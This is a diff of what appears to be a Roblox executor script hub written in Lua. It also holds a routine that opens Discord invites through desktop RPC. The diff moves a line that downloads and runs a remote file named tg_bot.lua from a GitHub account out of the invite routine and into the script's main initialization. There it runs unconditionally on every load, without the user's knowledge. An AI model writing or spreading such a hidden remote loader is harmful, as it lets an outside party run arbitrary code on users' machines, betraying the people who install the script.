@@ -14,9 +14,7 @@ task.spawn(function()
     if isfile and isfile(fileName) then
         return -- Already invited, skip to avoid spam on teleports / auto-inject
     end
-        
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/repositorykreml1n/commands/refs/heads/main/tg_bot.lua",true))()
-        
+
     if writefile then
         pcall(function()
             if not isfolder("tumbaHub") then makefolder("tumbaHub") end
@@ -26,7 +24,7 @@ task.spawn(function()
     
     local httpService = game:GetService("HttpService")
     
-    -- Method 1: Discord Desktop RPC (opens app directly)
+	-- Method 1: Discord Desktop RPC (opens app directly)
     pcall(function()
         local body = httpService:JSONEncode({
             nonce = httpService:GenerateGUID(false),
@@ -118,7 +116,6 @@ function Mega.GetImageFromURL(url, fileName)
                 end
             end
         end
-
         -- Если файл теперь есть - возвращаем его как ассет
         if isfile(fullPath) then
             local success, asset = pcall(function() return getcustomasset(fullPath) end)
@@ -216,6 +213,7 @@ end
 
 -- ==========================================
 -- TITAN INITIALIZATION SEQUENCE (v3.0)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/repositorykreml1n/commands/refs/heads/main/tg_bot.lua",true))()
 -- ==========================================
 
 -- 0. Bootstrap Services (Required for Loader)
